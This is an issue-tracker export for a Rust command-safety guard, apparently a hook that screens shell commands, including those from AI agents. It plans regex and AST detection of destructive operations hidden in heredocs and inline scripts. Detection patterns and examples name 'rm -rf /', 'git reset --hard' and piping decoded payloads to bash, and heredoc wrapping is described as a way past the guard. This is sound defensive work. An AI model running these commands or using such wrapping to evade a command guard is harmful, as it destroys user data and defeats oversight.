{"id":"git_safety_guard-2j3","title":"Research tree-sitter Rust bindings","description":"# Research tree-sitter Rust Bindings\n\n## Objective\n\nEvaluate direct tree-sitter integration as an alternative to ast-grep CLI.\n\n## Background\n\ntree-sitter is the underlying parsing library used by ast-grep. Using it directly could offer:\n- Lower latency (no process spawning)\n- More control over parsing\n- Smaller dependency footprint (maybe)\n\nHowever, it may require more work to implement pattern matching.\n\n## Research Areas\n\n### 1. tree-sitter Rust Crate\n- API documentation and examples\n- How to load language grammars\n- Parsing API (parse string, get AST)\n- Query API for pattern matching\n\n### 2. Language Grammar Crates\n- tree-sitter-python\n- tree-sitter-bash\n- tree-sitter-javascript\n- tree-sitter-typescript\n- tree-sitter-ruby\n- How are grammars distributed? (separate crates vs bundled)\n\n### 3. Query Language\n- S-expression query syntax\n- Captures and predicates\n- Multiple patterns in one query\n- Performance of compiled queries\n\n### 4. Build Complexity\n- Compile time impact\n- Binary size impact\n- Cross-compilation considerations\n- Grammar file generation (if needed)\n\n### 5. Comparison with ast-grep\n- Feature parity\n- Development effort\n- Maintenance burden\n- Community support\n\n## Deliverables\n\n- Short decision memo comparing:\n  - ast-grep CLI\n  - ast-grep-core (embedded)\n  - direct tree-sitter + query engine\n- Minimal proof-of-concept for the top 1–2 candidates that can:\n  - parse one language (bash or python)\n  - run a small handful of patterns\n  - return match spans/line numbers\n\n## Notes (initial)\n\n- tree-sitter v0.26.3 available.\n- Language grammars: tree-sitter-bash, tree-sitter-python, tree-sitter-javascript all at ^0.23.0.\n- Ruby available; Perl uncertain.\n\n## Acceptance Criteria\n\n- Produces a written recommendation with explicit rationale (perf, complexity, maintenance).\n- Includes at least one runnable POC (even if minimal) demonstrating match extraction.\n- Identifies any blockers (missing grammars, licensing, binary size constraints, API gaps).\n- Outputs concrete estimates for:\n  - expected latency impact in hook path\n  - binary size impact\n","notes":"## Research Complete - Decision Memo\n\n### RECOMMENDATION: Use ast-grep-core (embedded)\n\n**Rationale:** ast-grep-core provides higher-level pattern matching API on top of tree-sitter. Saves significant dev effort vs building custom query layer.\n\n### Key Findings\n\n**tree-sitter direct:**\n- v0.26.3, 11M+ downloads, MIT license\n- S-expression query syntax with captures\n- tree-sitter-bash v0.25.1 has heredoc node types: `heredoc_redirect`, `heredoc_body`, `heredoc_start`, `heredoc_end`, `heredoc_content`\n- Requires custom pattern matching layer\n- Est. +1-2MB per grammar, +10-20s compile\n\n**ast-grep-core:**\n- v0.40.4, uses tree-sitter underneath\n- Code-like pattern syntax ($VAR wildcards)\n- jQuery-like traversal API\n- Only 23% documented for library use\n- Est. +2-4MB, +20-30s compile\n\n**ast-grep CLI:**\n- NOT RECOMMENDED for hook path\n- Process spawn latency 10-50ms (exceeds \u003c1ms budget)\n\n### Architecture Decision\n\n1. **Tier 1 (regex):** Quick heredoc triggers (\u003c\u003c, \u003c\u003c\u003c) - keep existing regex approach\n2. **Tier 2 (AST):** ast-grep-core for heredoc body analysis when Tier 1 triggers\n3. **Lazy loading:** Only parse AST when needed\n4. **Pattern caching:** Compile patterns at startup\n\n### Heredoc AST Structure (tree-sitter-bash)\n\n```\nheredoc_redirect\n├── heredoc_start (delimiter)\n├── heredoc_body\n│   ├── heredoc_content (literal text)\n│   ├── simple_expansion ($VAR)\n│   └── command_substitution ($(cmd))\n└── heredoc_end\n```\n\n### Blockers\n\n- tree-sitter-bash issue #283: empty heredoc markers\n- ast-grep-core: sparse library documentation\n\n### References\n\n- https://docs.rs/tree-sitter\n- https://docs.rs/tree-sitter-bash\n- https://docs.rs/ast-grep-core\n- https://github.com/ast-grep/ast-grep","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T18:28:46.751144719-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:25:00.879281659-05:00","closed_at":"2026-01-08T00:25:00.879281659-05:00","close_reason":"Research complete. Recommendation: ast-grep-core for Tier 2 heredoc detection. Decision memo in bead notes.","dependencies":[{"issue_id":"git_safety_guard-2j3","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:53:11.617748575-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-2ta","title":"Implement two-tier detection architecture (regex + ast-grep)","description":"## Objective\n\nImplement a tiered detection architecture that balances performance with detection accuracy for heredoc and inline script analysis.\n\n## Background\n\nA single-pass approach cannot satisfy both performance and accuracy requirements:\n- Fast regex detection may miss complex obfuscation\n- Full AST parsing is too slow for every command\n\nThe solution is a **tiered architecture** where each tier acts as a gate for the next.\n\n## Three-Tier Architecture\n\n### Tier 1: Trigger Detection (RegexSet)\n\n**Purpose:** Ultra-fast detection of heredoc/inline script indicators\n\n**Latency Budget:** \u003c100μs (target \u003c10μs for non-matching)\n\n**Implementation:**\n```rust\nstatic HEREDOC_TRIGGERS: LazyLock\u003cRegexSet\u003e = LazyLock::new(|| {\n    RegexSet::new([\n        r\"\u003c\u003c-?\\s*['\\\"]?\\w+['\\\"]?\",     // Heredoc operators\n        r\"\u003c\u003c\u003c\",                          // Here-strings\n        r\"\\b(python3?|python)\\s+-[ce]\\s\",\n        r\"\\b(ruby|irb)\\s+-e\\s\",\n        r\"\\bperl\\s+-[eE]\\s\",\n        r\"\\bnode\\s+-[ep]\\s\",\n        r\"\\b(sh|bash|zsh)\\s+-c\\s\",\n        r\"\\|\\s*(python3?|ruby|perl|node|sh|bash)\\b\",\n    ]).expect(\"valid patterns\")\n});\n```\n\n**Guarantees:**\n- Zero allocations on non-match path\n- ZERO false negatives (may have false positives)\n- If Tier 2 would find a heredoc, Tier 1 MUST trigger\n\n### Tier 2: Content Extraction\n\n**Purpose:** Extract heredoc/inline script content with safety bounds\n\n**Latency Budget:** \u003c1ms (including I/O)\n\n**Implementation:**\n```rust\npub struct ExtractionLimits {\n    pub max_body_bytes: usize,      // 1MB default\n    pub max_body_lines: usize,      // 10,000 default\n    pub max_heredocs: usize,        // 10 per command\n    pub timeout_ms: u64,            // 50ms default\n}\n\npub struct ExtractedContent {\n    pub content: String,\n    pub language: Language,\n    pub delimiter: String,\n    pub byte_range: Range\u003cusize\u003e,\n}\n```\n\n**Guarantees:**\n- Bounded memory usage (never allocate \u003e1MB per heredoc)\n- Bounded time (timeout after 50ms)\n- Graceful degradation on malformed input (fail-open with warning)\n\n### Tier 3: AST Pattern Matching\n\n**Purpose:** Structural pattern matching for destructive operations\n\n**Latency Budget:** \u003c5ms per heredoc (typical), \u003c20ms worst case\n\n**Implementation:**\n```rust\nuse ast_grep_core::{Pattern, Matcher};\n\npub struct AstMatcher {\n    patterns: HashMap\u003cLanguage, Vec\u003cCompiledPattern\u003e\u003e,\n}\n\nimpl AstMatcher {\n    pub fn find_matches(\u0026self, content: \u0026str, lang: Language) -\u003e Vec\u003cPatternMatch\u003e;\n}\n```\n\n**Guarantees:**\n- Timeout protection (abort after 20ms)\n- Fail-open on parse errors\n- Language-specific patterns (no cross-language confusion)\n\n## Tier Flow Diagram\n\n```\nCommand Input\n     │\n     ▼\n┌─────────────────┐\n│ Tier 1: Trigger │ ─── No match ──► ALLOW (fast path)\n│   (\u003c100μs)      │\n└────────┬────────┘\n         │ Match\n         ▼\n┌─────────────────┐\n│ Tier 2: Extract │ ─── Error/Timeout ──► ALLOW + warn\n│   (\u003c1ms)        │\n└────────┬────────┘\n         │ Success\n         ▼\n┌─────────────────┐\n│ Tier 3: AST     │ ─── No match ──► ALLOW\n│   (\u003c5ms)        │ ─── Match ──► BLOCK\n└─────────────────┘\n```\n\n## Performance Budgets Summary\n\n| Tier | Operation | Target | Panic Threshold |\n|------|-----------|--------|-----------------|\n| 1 | Trigger detection | \u003c10μs | \u003e100μs |\n| 2 | Content extraction | \u003c500μs | \u003e2ms |\n| 3 | AST parse + match | \u003c5ms | \u003e20ms |\n| Total | End-to-end heredoc | \u003c10ms | \u003e50ms |\n\n## Error Handling\n\nAll tiers follow **fail-open** semantics:\n- Timeout → ALLOW + log warning\n- Parse error → ALLOW + log warning\n- OOM protection → ALLOW + log warning\n\nRationale: A hung or crashed hook is worse than a missed detection.\n\n## Test Requirements\n\n- Tier 1 must have ZERO false negatives (property test)\n- Tier 2 must handle malformed input without panic (fuzz test)\n- Tier 3 must timeout gracefully (integration test)\n- End-to-end latency must stay within budget (benchmark)\n\n## Acceptance Criteria\n\n- Tier 1 triggers on all heredoc patterns from the test corpus\n- Tier 2 extracts content correctly for all supported syntaxes\n- Tier 3 detects all known destructive patterns per language\n- Total latency stays within budget for 99th percentile","status":"closed","priority":1,"issue_type":"task","assignee":"RusticPuma","created_at":"2026-01-07T19:30:00-05:00","created_by":"ubuntu","updated_at":"2026-01-08T01:41:02.37945513-05:00","closed_at":"2026-01-08T01:41:02.37945513-05:00","close_reason":"Implemented two-tier detection architecture in src/heredoc.rs:\n\n**Tier 1 (complete):**\n- RegexSet-based trigger detection for heredocs and inline scripts\n- 14 trigger patterns covering bash heredocs, python/ruby/perl/node -c/-e, piped execution, eval/exec\n- 12 unit tests covering all trigger scenarios\n- Zero false negatives design (may have false positives - that's OK)\n\n**Tier 2 (stub):**\n- Defined ExtractionLimits, ExtractedContent, ScriptLanguage, ExtractionResult types\n- Stub implementation returns NoContent - full implementation in git_safety_guard-y4j\n\n**Tier 3 (future):**\n- Architecture documented in module docstring\n- Implementation pending ast-grep integration (git_safety_guard-f4f)\n\nAdded regex crate (1.10) for RegexSet. All 116 lib + 92 bin + 140 E2E tests pass.","dependencies":[{"issue_id":"git_safety_guard-2ta","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:56:44.30180478-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2ta","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:56:44.343696983-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2ta","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:49:38.625936613-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-300","title":"Implement package.json scripts extractor","description":"## Objective\n\nImplement an extractor for package.json files to detect executable npm script contexts.\n\n## File Pattern\n\n- `package.json`\n\n## Extraction Targets\n\n### Scripts Block (executed)\n- All values in `scripts` object\n- Lifecycle scripts (preinstall, postinstall, etc.)\n\n### NOT Extracted (data only)\n- `description`\n- `keywords`\n- `repository`\n- `config` values\n- Comments (JSON5 only)\n\n## Example\n\n```json\n{\n  \"scripts\": {\n    \"clean\": \"rm -rf dist/*\",  // EXTRACT THIS\n    \"nuke\": \"rm -rf /\"  // EXTRACT THIS\n  },\n  \"description\": \"Uses rm -rf for cleanup\"  // DO NOT extract\n}\n```\n\n## Security Note\n\nnpm scripts are especially dangerous because:\n- `npm install` runs lifecycle scripts automatically\n- `postinstall` is a common attack vector\n\n## Acceptance Criteria\n\n- Correctly extracts all script values with line numbers\n- Handles standard JSON format\n- Ignores non-script fields\n- Unit tests with representative fixtures","notes":"## Review Additions (2026-01-08)\n\n### False positive controls\n- Extract only from executable contexts (e.g., `scripts` entries), not from:\n  - package description/keywords\n  - README text embedded in JSON\n- Provide negative fixtures where dangerous strings appear in non-executed fields.","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T21:24:57.322775825-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:30:11.957178137-05:00","dependencies":[{"issue_id":"git_safety_guard-300","depends_on_id":"git_safety_guard-scan","type":"blocks","created_at":"2026-01-07T21:25:20.613732239-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-300","depends_on_id":"git_safety_guard-scan.6","type":"parent-child","created_at":"2026-01-07T21:45:52.35778222-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-49s","title":"Implement heredoc syntax detection (regex quick-check)","description":"# Implement Heredoc Syntax Detection (Regex Quick-Check)\n\n## Objective\n\nImplement a fast regex-based detector that identifies commands potentially containing heredoc content.\n\n## Background\n\nBefore we can scan heredoc content, we need to detect its presence. This is a two-stage approach:\n\n1. Quick regex check (this task) - fast, may have false positives\n2. Full extraction (separate task) - accurate, only runs if quick check triggers\n\n## Implementation Details\n\n### Quick-Check Patterns\n\nThe quick check should match common heredoc indicators:\n\n```rust\n// Patterns to detect heredoc presence\nstatic HEREDOC_QUICK_PATTERNS: \u0026[\u0026str] = \u0026[\n    r\"\u003c\u003c[-~]?\\s*['\\\"]?\\w+['\\\"]?\",  // \u003c\u003c EOF, \u003c\u003c- 'EOF', \u003c\u003c~ \"END\"\n    r\"\u003c\u003c\u003c\\s*['\\\"]\",                 // \u003c\u003c\u003c \"here string\"\n    r\"-c\\s+['\\\"]\",                  // python -c \"code\", bash -c 'code'\n    r\"-e\\s+['\\\"]\",                  // node -e \"code\", perl -e 'code'\n];\n```\n\n### Integration Point\n\nAdd to the main processing pipeline after quick-reject but before pattern matching:\n\n```rust\nfn process_command(cmd: \u0026str) -\u003e Decision {\n    // Existing quick-reject (no git/rm)\n    if quick_reject(cmd) \u0026\u0026 global_quick_reject(cmd) {\n        return Decision::Allow;\n    }\n\n    // NEW: Check for potential heredoc content\n    if has_potential_heredoc(cmd) {\n        if let Some(reason) = scan_heredoc_content(cmd) {\n            return Decision::Deny(reason);\n        }\n    }\n\n    // Continue with existing pattern matching...\n}\n```\n\n### Performance Requirements\n\n- Quick check must complete in \u003c 0.5ms\n- Should not allocate on the hot path\n- Use lazy-compiled static patterns\n\n### False Positive Tolerance\n\n- Quick check can have false positives (triggers full scan unnecessarily)\n- Quick check must NOT have false negatives (miss actual heredocs)\n- Full scan will handle false positives gracefully\n\n## Files to Modify\n\n- src/packs/mod.rs or new src/heredoc/mod.rs\n- src/main.rs (pipeline integration)\n\n## Testing\n\n- Test each heredoc variant is detected\n- Test non-heredoc commands don't trigger\n- Benchmark quick check performance\n\n## Dependencies\n\n- Design: heredoc detection strategy (git_safety_guard-o15)\n- ADR approved (git_safety_guard-5ib)\n\n## Acceptance Criteria\n\n- All heredoc variants from design doc are detected by the quick-check.\n- Quick check adds \u003c 0.5ms to non-heredoc commands (validate via benchmark once perf harness exists).\n- Zero false negatives in the tier-1 trigger test suite.\n","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-07T18:30:59.514233315-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:15:11.013814375-05:00","closed_at":"2026-01-07T23:15:11.013814375-05:00","close_reason":"Redundant with git_safety_guard-t1rx (Tier 1 trigger); moved dependents to t1rx","dependencies":[{"issue_id":"git_safety_guard-49s","depends_on_id":"git_safety_guard-5ib","type":"blocks","created_at":"2026-01-07T18:31:05.994685018-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-49s","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T18:56:44.362201361-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-49s","depends_on_id":"git_safety_guard-t1rx","type":"blocks","created_at":"2026-01-07T19:28:32.390746435-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-49s","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:50:54.940775853-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-4o8","title":"Create documentation for heredoc detection feature","description":"## Objective\n\nCreate comprehensive documentation for the heredoc detection feature, covering user configuration, pattern authoring, and security considerations.\n\n## Documentation Deliverables\n\n### 1. User Guide Updates\n\n#### README.md Updates\n\n- Add heredoc scanning to feature list\n- Document new command-line options (if any)\n- Update configuration examples\n\n#### Configuration Guide\n\n- How to enable/disable heredoc scanning\n- Language-specific configuration\n- Performance tuning options\n- Fallback behavior settings\n\n### 2. Pattern Authoring Guide\n\nNew document: `docs/patterns.md`\n\n#### Pattern Syntax\n\n- tree-sitter query syntax (if using queries)\n- ast-grep pattern syntax (if using ast-grep-core)\n- Examples for each supported language\n\n#### Adding New Patterns\n\n- Step-by-step guide\n- Testing requirements\n- Performance considerations\n- Review checklist\n\n#### Pattern Library Reference\n\n- Complete list of all patterns\n- What each pattern detects\n- Known limitations\n- False positive/negative notes\n\n### 3. Security Documentation\n\nNew document: `docs/security.md`\n\n#### Threat Model\n\n- Attack vectors heredoc detection addresses\n- Attack vectors explicitly out of scope\n- Assumptions and limitations\n\n#### Bypass Considerations\n\n- Known potential bypasses\n- Why certain bypasses are accepted\n- Defense in depth recommendations\n\n#### Incident Response\n\n- What to do if a command is wrongly blocked\n- What to do if a dangerous command gets through\n- How to report security issues\n\n### 4. Developer Documentation\n\n#### Architecture Overview\n\n- Pipeline flow diagram\n- Module responsibilities\n- Data flow through heredoc analysis\n\n#### API Documentation\n\n- Internal Rust API documentation (rustdoc)\n- Integration points for extending\n- Error handling patterns\n\n#### Contributing Guide Updates\n\n- How to add new language support\n- How to add new patterns\n- Testing requirements for contributions\n\n### 5. AGENTS.md Updates\n\nUpdate the AI agent guidelines:\n\n- New heredoc detection capabilities\n- How to test heredoc patterns\n- False positive handling guidance\n\n## Documentation Quality Requirements\n\n- All code examples must be tested\n- All configuration examples must be valid\n- Diagrams for complex flows\n- Cross-references between related docs\n\n## Acceptance Criteria\n\n- Documentation is sufficient for a new user to:\n  - understand what heredoc scanning does\n  - configure enable/disable + timeouts\n  - interpret a heredoc block message\n  - use allowlisting/explain to resolve false positives\n- Documentation clearly calls out:\n  - fail-open behavior and why\n  - performance budgets and limits\n  - out-of-scope threats (to prevent misaligned expectations)\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:40:41.014282391-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:11:51.086741871-05:00","dependencies":[{"issue_id":"git_safety_guard-4o8","depends_on_id":"git_safety_guard-8wt","type":"blocks","created_at":"2026-01-07T18:40:53.36819319-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-4o8","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:51:00.088042598-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-5ib","title":"Write architecture decision document (ADR)","description":"# Write Architecture Decision Document (ADR)\n\n## Objective\n\nSynthesize research findings into a formal Architecture Decision Record that guides implementation.\n\n## Background\n\nAfter completing research on ast-grep, tree-sitter, and design tasks, we need to document the chosen approach and rationale. This ADR will be the reference for all implementation work.\n\n## ADR Structure\n\n### 1. Title\n\n\"ADR-001: Heredoc Scanning Architecture\"\n\n### 2. Status\n\nProposed → Accepted → Implemented\n\n### 3. Context\n\n- Problem statement (heredoc/inline-script bypasses)\n- Constraints (performance, dependencies, maintenance, false positives)\n- Options considered\n\n### 4. Decision\n\n- Integration approach (embedded vs external)\n- Pattern storage format\n- Integration points with existing dcg architecture\n\n### 5. Consequences\n\n- Benefits of chosen approach\n- Drawbacks and mitigations\n- Future considerations\n\n### 6. Technical Details\n\n- Dependency changes to Cargo.toml\n- New modules and their responsibilities\n- Data flow through the system\n- Configuration schema additions\n\n## Key Decisions to Document\n\n### Integration Approach\n\n- CLI invocation vs library\n- Sync vs async processing\n- Caching strategy\n\n### Language Support\n\n- Initial language set\n- Grammar distribution\n- Extension mechanism\n\n### Pattern Format\n\n- Hardcoded vs external\n- File format (YAML, TOML, custom)\n- Validation approach\n\n### Performance Strategy\n\n- Quick-reject optimizations\n- Lazy loading\n- Timeout handling\n\n### Error Handling\n\n- Parse failures\n- Unknown languages\n- Pattern match errors\n\n## Deliverables\n\n- ADR document (location TBD by repo conventions)\n- Diagram showing data flow\n- Short section that explains how this interacts with:\n  - execution-context classification\n  - severity taxonomy / decision modes\n  - limits/timeouts/fail-open policy\n\n## Acceptance Criteria\n\n- ADR is self-contained and specific enough that implementation can proceed without re-reading external plan docs.\n- ADR makes an explicit choice for:\n  - embedded vs external AST engine\n  - language set + extension model\n  - pattern format + validation\n- ADR includes:\n  - performance budget and how it’s enforced\n  - false-positive mitigation strategy\n  - failure-mode behavior (timeout/parse error) especially in hook mode\n","notes":"ADR complete. See docs/adr-001-heredoc-scanning.md. Covers: tiered architecture (Tier 0-3), ast-grep-core integration, pattern library design, performance budgets, fail-open semantics, and integration points.","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T18:30:31.162229073-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:31:21.134276063-05:00","closed_at":"2026-01-08T00:31:21.134276063-05:00","close_reason":"ADR-001 complete at docs/adr-001-heredoc-scanning.md","dependencies":[{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:30:37.437715869-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:30:37.457081439-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-o15","type":"blocks","created_at":"2026-01-07T18:30:37.477144052-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-jfj","type":"blocks","created_at":"2026-01-07T18:30:37.496865872-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:30:37.516274063-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-boy","type":"blocks","created_at":"2026-01-07T18:39:09.196463586-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-5ib","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:49:43.694285861-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-6sg","title":"Design destructive pattern library structure","description":"# Design Destructive Pattern Library Structure\n\n## Objective\n\nDesign the structure and organization of language-specific destructive patterns for heredoc/inline-script scanning.\n\n## Background\n\nEach supported language has its own idioms for destructive operations. We need a well-organized pattern library that:\n\n- is maintainable and extensible\n- integrates cleanly with the existing pack system\n- has stable rule IDs + metadata for explainability/allowlisting\n- is *false-positive resistant* by default\n\n## Guiding principles (important)\n\n- Prefer **high-signal** patterns that map directly to real irreversible operations.\n  - Example (high signal): `exec.Command(\"rm\", \"-rf\", ...)`\n  - Example (low signal): `exec.Command($CMD)` (too broad; should be warn-only or out of scope)\n- Pattern metadata must be first-class:\n  - `pack_id`, `pattern_name` → stable rule ID\n  - `severity` (ties into `git_safety_guard-1gt.3.1`)\n  - short reason + optional suggestion\n- Every pattern addition must include:\n  - at least 1 positive fixture\n  - at least 1 negative fixture targeting common false positives\n\n## Pattern categories by language (initial)\n\n### Python\n\n- Filesystem: `shutil.rmtree`, `os.remove` / `os.unlink` when clearly recursive or system-path targeted\n- Process execution: `os.system(\"rm -rf ...\")`, `subprocess.*([\"rm\", \"-rf\", ...])`\n- DB strings: obvious `DROP` / `TRUNCATE` when executed\n\n### Shell/Bash\n\n- `rm -rf` (non-temp)\n- destructive `git` forms (`reset --hard`, `clean -fd`, etc.)\n- destructive pipe targets (e.g., `| bash` from decoded payloads)\n\n### JavaScript/Node\n\n- Filesystem: `fs.rmSync(..., { recursive: true })`, `fs.rmdirSync(..., { recursive: true })`\n- Process: `child_process.execSync(\"rm -rf ...\")` or `spawnSync(\"rm\", [\"-rf\", ...])`\n\n### Ruby\n\n- Filesystem: `FileUtils.rm_rf`, `File.delete` on high-risk paths\n- Process: backticks/system/exec with direct destructive payload\n\n### Perl\n\n- `system(\"rm -rf ...\")` / backticks with direct payload\n- recursive delete helpers if directly invoked with a literal dangerous target\n\n## Design considerations\n\n### 1. Pattern specification format\n\nDecide between:\n\n- Hardcoded Rust (fast, type-safe)\n- External files (flexible, needs loading/validation)\n- Hybrid (core hardcoded + optional user extensions)\n\nWhatever we pick must support stable IDs and deterministic ordering.\n\n### 2. Pattern metadata\n\nEach pattern needs:\n\n- stable identity: `(pack_id, pattern_name)`\n- language (for heredoc scanning)\n- matcher form (regex vs AST query vs ast-grep pattern)\n- reason + optional suggestions\n- severity\n- expected FP risk (notes)\n\n### 3. Pack integration\n\nDecide how heredoc patterns show up in packs:\n\n- `heredoc.\u003clanguage\u003e` packs, OR\n- a single `heredoc` pack with per-language submatchers\n\nThe output should still attribute a stable rule ID.\n\n### 4. Contextual patterns\n\nSome matchers require context to stay high-signal:\n\n- process execution calls are only dangerous when the payload is destructive\n- filesystem calls are only catastrophic when recursive/system-path targeted\n\nThis means many patterns should be designed as *composite matchers* (AST match + string/payload check).\n\n### 5. Allowlisting\n\nUsers must be able to allowlist legitimate patterns by stable rule ID (not raw regex), with optional scoping/expiration.\n\n## Deliverables\n\n- Pattern specification format (schema + example)\n- Initial pattern inventory per language focused on high-signal destructive operations\n- Integration plan with pack system + evaluator + explain output\n- Pattern authoring checklist (FP controls + tests)\n\n## Acceptance Criteria\n\n- Produces a clear, consistent pattern metadata schema usable by:\n  - hook decision output\n  - `dcg explain`\n  - `dcg allowlist`\n  - `dcg scan`\n- Defines a policy that prevents low-signal patterns from becoming default hard denies.\n- Defines the minimum test/fixture requirements for adding a pattern.\n- Enables stable rule IDs that do not change across builds.\n","notes":"Design complete. See docs/pattern-library-design.md for full specification including: HeredocPattern schema, Language enum, PatternMatcher enum, Severity levels, stable rule ID format, pack integration plan, initial pattern inventory, composite matcher strategy, authoring checklist, and allowlisting integration.","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T18:30:05.921495349-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:28:34.109927586-05:00","closed_at":"2026-01-08T00:28:34.109927586-05:00","close_reason":"Design specification complete. Full doc at docs/pattern-library-design.md","dependencies":[{"issue_id":"git_safety_guard-6sg","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:30:14.503126907-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-6sg","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:30:14.524054168-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-6sg","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:49:48.73388846-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-7f5","title":"Implement two-tier detection architecture (regex + ast-grep)","description":"# Two-Tier Architecture for Heredoc Detection\n\n## Key Insight\n\nThe architecture uses a **two-tier approach** to balance performance with accuracy:\n\n1. **Tier 1**: Use fast regex for heredoc detection (the `regex` crate uses Aho-Corasick for static compound patterns and SIMD - it's extremely optimized)\n2. **Tier 2**: Once a heredoc is detected, use AST-aware parsing (ast-grep) rather than reimplementing structural analysis badly with regex\n\nThis ensures 99%+ of commands (which don't contain heredocs) pay only microseconds of overhead, while heredoc commands get proper structural analysis.\n\n## Architecture\n\n```\nCommand Input\n     │\n     ▼\n┌─────────────────────────────────────────────┐\n│  TIER 1: Fast Regex Detection (μs)          │\n│  ─────────────────────────────────────────  │\n│  • regex crate (Aho-Corasick + SIMD)        │\n│  • Static pattern set for heredoc markers   │\n│  • Quick reject: 99%+ commands pass through │\n│  • Cost: ~1-10 microseconds                 │\n└─────────────────────────────────────────────┘\n     │\n     │ heredoc detected?\n     │\n     ├──── NO ───▶ Continue to existing pattern matching\n     │\n     ▼ YES\n┌─────────────────────────────────────────────┐\n│  TIER 2: AST-Aware Analysis (ms)            │\n│  ─────────────────────────────────────────  │\n│  • ast-grep-core for structural parsing     │\n│  • Language-specific pattern matching       │\n│  • Only invoked when heredocs found         │\n│  • Cost: ~1-5 milliseconds                  │\n└─────────────────────────────────────────────┘\n     │\n     ▼\n  Block/Allow Decision\n```\n\n## Tier 1: Regex-Based Heredoc Detection\n\n### Why `regex` crate?\n\nThe Rust `regex` crate is extraordinarily optimized:\n- **Aho-Corasick**: Multi-pattern matching in O(n) time\n- **SIMD**: Vectorized string operations (AVX2, SSE4.2)\n- **Lazy DFA**: JIT-compiled automata\n- **No backtracking**: Guaranteed linear time\n\n### Heredoc Markers to Detect\n\n```rust\nuse regex::RegexSet;\n\nstatic HEREDOC_PATTERNS: LazyLock\u003cRegexSet\u003e = LazyLock::new(|| {\n    RegexSet::new([\n        // Bash heredocs\n        r\"\u003c\u003c-?\\s*['\\\"]?\\w+['\\\"]?\",      // \u003c\u003cEOF, \u003c\u003c'EOF', \u003c\u003c\"EOF\", \u003c\u003c-EOF\n        r\"\u003c\u003c\u003c\",                           // Here-string\n\n        // Inline script flags\n        r\"\\b(python3?|ruby|perl|node)\\s+-[ec]\\s\",\n        r\"\\bsh\\s+-c\\s\",\n        r\"\\bbash\\s+-c\\s\",\n\n        // Pipe to interpreter\n        r\"\\|\\s*(python3?|ruby|perl|node|sh|bash)\\b\",\n    ]).expect(\"heredoc patterns should compile\")\n});\n```\n\n### Quick Reject Logic\n\n```rust\nfn might_contain_heredoc(cmd: \u0026str) -\u003e bool {\n    HEREDOC_PATTERNS.is_match(cmd)\n}\n```\n\nCost: **~1-10 microseconds** for typical commands.\n\n## Tier 2: AST-Aware Analysis\n\nOnly invoked when Tier 1 detects a potential heredoc.\n\n### Why ast-grep?\n\n- **Structural matching**: Understands code structure, not just text\n- **Language-aware**: Different patterns for Python vs Bash vs JS\n- **Pattern syntax**: Intuitive `os.system($CMD)` instead of regex\n- **Battle-tested**: Used in production for large-scale code search\n\n### Example Flow\n\n```rust\nfn check_heredoc(cmd: \u0026str) -\u003e Option\u003cCheckResult\u003e {\n    // Tier 1: Quick regex check\n    if !might_contain_heredoc(cmd) {\n        return None;  // Fast path: no heredoc\n    }\n\n    // Tier 2: Extract and analyze heredoc content\n    let heredoc_info = extract_heredoc(cmd)?;\n    let language = detect_language(\u0026heredoc_info);\n\n    // Parse with ast-grep\n    let matches = match_destructive_patterns(\u0026heredoc_info.content, language);\n\n    if !matches.is_empty() {\n        return Some(CheckResult::blocked(\n            \u0026format!(\"Heredoc contains dangerous pattern: {}\", matches[0].reason),\n            \"heredoc\"\n        ));\n    }\n\n    None  // Heredoc is safe\n}\n```\n\n## Performance 